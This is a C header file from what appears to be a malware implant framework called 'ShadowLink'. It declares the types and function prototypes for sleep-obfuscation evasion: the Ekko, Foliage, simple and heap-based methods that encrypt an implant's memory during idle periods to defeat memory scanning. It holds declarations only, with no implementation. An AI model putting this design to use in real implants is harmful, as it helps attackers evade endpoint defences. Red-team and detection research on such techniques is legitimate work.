/*
 * ShadowLink Sleep Obfuscation
 * Phase 11: Memory Evasion
 * 
 * Implements multiple sleep obfuscation techniques:
 * 1. Ekko - Uses ROP chain with timer callbacks
 * 2. Foliage - Uses APC queuing with timer
 * 3. Simple - Basic memory encryption during sleep
 * 
 * These techniques:
 * - Encrypt the agent's memory while sleeping
 * - Make memory scanning ineffective
 * - Avoid detection of known patterns during idle
 */

#ifndef SLEEP_OBFUSCATION_H
#define SLEEP_OBFUSCATION_H

#include <windows.h>

// Sleep obfuscation methods
typedef enum {
    SLEEP_METHOD_NORMAL,      // Standard Sleep() - detectable
    SLEEP_METHOD_SIMPLE,      // Basic encrypt/decrypt around Sleep
    SLEEP_METHOD_EKKO,        // Ekko technique (ROP + timer)
    SLEEP_METHOD_FOLIAGE,     // Foliage technique (APC + timer)
    SLEEP_METHOD_HEAP_BASED   // Encrypt heap during sleep
} SLEEP_METHOD;

// Configuration
typedef struct _SLEEP_CONFIG {
    SLEEP_METHOD method;
    DWORD dwKeySize;           // Encryption key size (16 or 32)
    BOOL bProtectStack;        // Also protect stack
    BOOL bProtectHeap;         // Also protect heap
    BYTE key[32];              // XOR/RC4 key
} SLEEP_CONFIG, *PSLEEP_CONFIG;

// Memory region to protect
typedef struct _PROTECTED_REGION {
    PVOID pBase;
    SIZE_T size;
    DWORD originalProtect;
} PROTECTED_REGION, *PPROTECTED_REGION;

// Function prototypes
void init_sleep_obfuscation(SLEEP_METHOD method);
void obfuscated_sleep(DWORD dwMilliseconds);

// Individual techniques
void sleep_simple(DWORD dwMilliseconds);
void sleep_ekko(DWORD dwMilliseconds);
void sleep_foliage(DWORD dwMilliseconds);
void sleep_heap_based(DWORD dwMilliseconds);

// Utility functions
void generate_random_key(BYTE *key, DWORD size);
void xor_memory_region(PVOID pBase, SIZE_T size, BYTE *key, DWORD keySize);
BOOL get_module_regions(HMODULE hModule, PPROTECTED_REGION *ppRegions, DWORD *pdwCount);
void free_regions(PPROTECTED_REGION pRegions);

#endif // SLEEP_OBFUSCATION_H
